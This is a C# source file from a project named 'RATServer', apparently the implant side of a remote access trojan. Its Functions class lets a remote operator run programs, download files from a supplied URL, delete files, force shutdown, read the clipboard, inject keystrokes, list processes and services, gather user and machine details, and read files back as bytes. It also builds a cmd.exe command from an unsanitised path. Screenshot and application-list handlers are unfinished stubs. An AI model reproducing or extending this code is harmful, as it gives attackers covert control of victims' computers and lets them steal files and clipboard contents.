﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.ServiceProcess;

namespace RATServer
{
    public class Functions
    {
        public static Response Message(string Msg)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                MessageBox.Show(Msg);
                r.Msg = "Message Success";
            } catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response Run(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start(Path);        
                r.Msg = "Run Success";
            } catch (Exception e) { r.Msg = e.Message; }            
            return r;
        }
        public static Response PCInfo()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Processes()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
            }
            catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response Delete(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                if (File.Exists(Path))
                {
                    File.Delete(Path);
                    r.Msg = "Delete Success";
                } else r.Msg = "File Not Found";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Download(string IP, string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                using (var c = new WebClient()) c.DownloadFile(IP, Path);
                r.Msg = "Download Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ShutDown()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start("cmd.exe shutdown -s -f -t 00");
                r.Msg = "Shutdown Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ClipBoard()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                r.Msg = Clipboard.GetText();
            }
            catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response KeyPress(string Keys)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                SendKeys.SendWait(Keys);
                r.Msg = "SendKeys Success";                
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Retrieve(string Dir)
        {
            //issues with large files likely due to predetermined connection buffer size
            Response r = new Response { Type = "Data" };
            try
            {
                r.Msg = Path.GetFileName(Dir);
                r.Data = File.ReadAllBytes(Dir);
            }
            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
            return r;
        }
        public static Response Services()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                ServiceController[] sc = ServiceController.GetServices();
                foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Search(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c dir " + Path;
                p.Start();
                r.Msg = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ScreenShot()
        {
            //work in progress
            Response r = new Response { Type = "Data" };
            try
            {
                //r.Msg = filename;
                //r.Data = data;
            }
            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
            return r;
        }
        public static Response Applications()
        {
            //work in progress
            Response r = new Response { Type = "Message" };
            try
            {
                r.Msg = "ApplicationsList";
            }
            catch (Exception e) { r.Msg = e.Message; }        
            return r;
        }
    }
}